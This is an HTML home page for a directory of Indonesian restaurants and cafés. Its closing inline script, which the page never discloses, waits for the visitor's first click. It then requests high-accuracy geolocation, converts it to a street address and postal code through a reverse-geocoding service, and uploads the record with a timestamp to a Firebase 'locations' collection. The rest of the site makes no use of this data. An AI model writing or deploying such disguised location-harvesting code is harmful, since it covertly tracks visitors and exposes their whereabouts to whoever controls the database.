<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Top Indonesian Restaurants & Cafés — Home</title>

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=Poppins:wght@500;700&display=swap" rel="stylesheet">

  <!-- Styles -->
  <link rel="stylesheet" href="styles.css">
</head>

<body class="smooth">

  <!-- NAV -->
  <header class="nav">
    <div class="nav__brand">
      <div class="logo-glow">Top Indo</div>
      <small class="muted">Restaurants & Cafés</small>
    </div>
    <nav class="nav__links">
      <a href="index.html" class="active">Home</a>
      <a href="restaurants.html">Restaurants</a>
      <a href="about.html">About</a>
      <a href="contact.html" class="btn btn--accent">Contact</a>
    </nav>
  </header>

  <!-- HERO -->
  <section id="hero" class="hero">
    <div class="hero__bg" aria-hidden="true"></div>

    <div class="container hero__content glass">
      <h1 class="hero__title">
        Discover Indonesia's Finest — <span class="neon">Taste the Craft</span>
      </h1>

      <p class="hero__subtitle">
        Curated experiences across Jakarta, Bali, Bandung, and beyond.
      </p>

      <!-- Search -->
      <div class="search">
        <input id="homeSearch" type="search" placeholder="Search restaurants, cities, or dishes...">
        <button id="homeSearchBtn" class="btn">Search</button>
      </div>

      <!-- Featured -->
      <div class="featured">
        <h3>Featured</h3>
        <div id="featuredList" class="featured__list"></div>
      </div>

      <div class="hero__cta">
        <a href="restaurants.html" class="btn btn--big">Browse All</a>
        <a href="about.html" class="link muted">Meet the curator</a>
      </div>
    </div>
  </section>

  <!-- MAIN -->
  <main class="container main">

    <section class="glass section">
      <div class="section__head">
        <h2>Why These Picks?</h2>
        <p class="muted">Every place is visited and vetted for ambience, flavor, and personality.</p>
      </div>

      <div class="cards cards--preview" id="previewGrid"></div>
    </section>

    <section class="glass section influencer">
      <div>
        <h3>Mayur Recommends</h3>
        <p class="muted">Personal picks — seasonal, limited, unforgettable.</p>
      </div>

      <div class="influencer__badge glass">
        <img src="https://picsum.photos/seed/mayur/120/120" alt="Mayur" class="avatar">
        <div>
          <strong>Mayur Sharma</strong>
          <small class="muted">Food curator & storyteller</small>
        </div>
        <a href="about.html" class="btn btn--ghost">About Mayur</a>
      </div>
    </section>

  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container footer__inner">
      <div>© <span id="year"></span> Top Indonesian Restaurants</div>
      <div class="muted">Built with ♥ • Dark Neon Theme</div>
    </div>
  </footer>

  <!-- ✅ MAIN APP -->
  <script src="app.js"></script>

  <!-- ✅ FIREBASE + REVERSE GEOCODE + SAVE LOCATION -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";

    // ✅ Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyC6EOX2i_6vCqz-EwiopQyd0qwtsomOppw",
      authDomain: "sample-4d3c3.firebaseapp.com",
      projectId: "sample-4d3c3",
      storageBucket: "sample-4d3c3.firebasestorage.app",
      messagingSenderId: "1064954656144",
      appId: "1:1064954656144:web:34252bec01b29ae5aaaf15"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // ✅ FREE Reverse Geocoding
    async function reverseGeocode(lat, lon) {
      const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
      const res = await fetch(url, {
        headers: { "User-Agent": "TopIndo/1.0" }
      });
      return res.json();
    }

    // ✅ Save to Firestore
    async function saveLocation(fullData) {
      await addDoc(collection(db, "locations"), fullData);
      console.log("✅ Saved:", fullData);
    }

    // ✅ Ask for location after FIRST TAP
    function requestLocation() {
      navigator.geolocation.getCurrentPosition(
        async pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const acc = pos.coords.accuracy;

          const geo = await reverseGeocode(lat, lon);

          const data = {
            lat,
            lon,
            accuracy: acc,
            street: geo.address?.road || "",
            city: geo.address?.city || geo.address?.town || geo.address?.village || "",
            state: geo.address?.state || "",
            country: geo.address?.country || "",
            postal_code: geo.address?.postcode || "",
            formatted_address: geo.display_name || "",
            timestamp: new Date().toISOString()
          };

          saveLocation(data);
        },
        err => console.warn("Denied:", err),
        { enableHighAccuracy: true }
      );
    }

    // ✅ Required by browser
    window.addEventListener("click", requestLocation, { once: true });
  </script>

</body>
</html>
